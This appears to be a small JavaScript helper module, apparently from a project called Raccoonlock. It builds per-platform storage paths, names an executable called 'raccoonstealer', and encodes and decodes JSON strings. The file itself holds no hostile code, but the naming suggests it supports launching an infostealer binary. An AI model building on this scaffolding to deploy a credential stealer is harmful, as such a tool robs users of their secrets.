class interfaces{
	constructor(platform){
		this.platform = platform;
	}

	getPath(){
		if (this.platform === "win32"){
			const path = `${process.env.LOCALAPPDATA}\\Raccoonlock`;
			return path;
		}else if(this.platform === "linux"){
			const os = require("os");
			const path = `${os.homedir()}/.raccoonlock`;
			return path;
		}
	}

	getStealer(){
		if (this.platform === "win32"){
			return 'raccoonstealer.exe';
		}else if(this.platform === "linux"){
			return './raccoonstealer';
		}
	}

	getCorrectJSON(string){
		let jsonOnly = decodeURIComponent(string);
		let last = jsonOnly.lastIndexOf('}');
		if (last === -1) return `${string} is not a valid JSON string`;
		return jsonOnly.substring(0, last + 1);

	}

	makeCorrectJSON(string){
		let newString = encodeURIComponent(string);
		return newString;
	}
}

module.exports = interfaces;
